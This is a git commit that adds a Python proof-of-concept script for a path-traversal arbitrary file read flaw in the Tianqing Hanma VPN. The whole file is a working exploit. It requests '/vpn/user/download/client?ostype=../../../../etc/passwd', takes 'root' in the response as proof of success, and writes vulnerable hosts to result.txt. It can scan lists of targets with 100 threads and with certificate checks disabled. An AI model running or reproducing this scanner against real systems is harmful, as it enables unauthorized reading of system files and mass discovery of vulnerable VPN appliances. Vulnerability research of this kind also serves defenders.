a37006c22c598d05f2d87d73d75102302fe5ba96
予怡 <3058727187@qq.com>
2025-08-19 18:42:43 +0800

    Add files via upload

---
+++ 天清汉马vpn任意文件读取/poc.py
@@ -0,0 +1,55 @@
+import argparse,requests,re,sys
+from multiprocessing.dummy import Pool
+from urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+def a():
+    text="""
+██████╗  ██████╗  ██████╗
+██╔══██╗██╔═══██╗██╔════╝
+██████╔╝██║   ██║██║     
+██╔═══╝ ██║   ██║██║     
+██║     ╚██████╔╝╚██████╗
+╚═╝      ╚═════╝  ╚═════╝
+                                                         
+"""
+    print(text)
+
+def poc(target):
+    payloade="/vpn/user/download/client?ostype=../../../../../../../../../etc/passwd"
+    headers={
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36"}
+    try:
+        res=requests.get(url=target+payloade,verify=False,headers=headers)
+        if re.search('(root)',res.text).group(0)=="root":
+            print(f"[+]{target}存在vpn任意文件读取漏洞")
+            with open("result.txt",'a',encoding="utf-8")as f:
+                    f.write(target+'\n')
+        else:
+            print(f"[-]{target}不存在漏洞")     
+    except:
+        pass
+
+
+def main():
+    a()
+    parse=argparse.ArgumentParser(description="天清汉马vpn任意文件读取")
+    parse.add_argument('-u','--url',type=str,help="please input your link",dest="url")
+    parse.add_argument('-f','--file',type=str,help="please input your file",dest="file")
+    args=parse.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif args.file and not args.url:
+        urllist=[]
+        with open(args.file,'r',encoding='utf-8')as fp:
+            for i in fp.readlines():
+                urllist.append(i.strip())
+        mp=Pool(100)
+        mp.map(poc,urllist)
+        mp.close
+        mp.join
+    else:
+        print(f"Usage : Python {sys.argv[0]} -h") 
+
+if __name__=="__main__":
+    main()
